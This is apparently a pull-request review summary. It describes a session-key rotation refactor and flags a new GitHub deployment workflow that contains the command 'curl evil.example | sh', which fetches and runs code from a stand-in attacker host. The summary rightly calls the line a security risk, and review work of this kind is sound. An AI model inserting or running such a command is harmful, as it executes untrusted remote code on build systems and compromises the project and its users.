Summary of this PR:

• Refactors session handling by cleaning up and rotating session keys (modifications in `src/auth/session.py`, with 12 lines changed including both insertions and deletions).

• Contains a deployment workflow file creation (`.github/workflows/deploy.yml`) with content that includes a command to execute `curl evil.example | sh`. This remote command execution is highly suspicious and may be a security risk.
